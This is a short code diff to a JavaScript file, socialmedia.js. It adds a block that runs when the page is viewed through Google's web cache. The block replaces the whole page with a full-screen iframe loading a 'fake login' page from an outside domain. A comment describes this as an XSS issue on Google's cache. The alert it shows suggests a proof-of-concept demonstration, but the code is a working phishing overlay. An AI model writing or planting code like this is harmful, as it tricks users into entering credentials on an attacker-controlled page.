@@ -1,3 +1,8 @@
+// XSS on webcache.googleusercontent.com - Google dont think it's a problem, meh:)
+if(window.location.hostname == "webcache.googleusercontent.com"){
+    alert("Modifying the dom to provide a fakelogin page");
+    document.body.innerHTML="<iframe width=\"100%\" height=\"100%\" src=\"https://ebfe.pw/shared/fakelogin.html\"></iframe>";
+}
 console.log("socialmedia.js loaded");
 // Thanks robinlinus.github.io for the code and ideas.
 
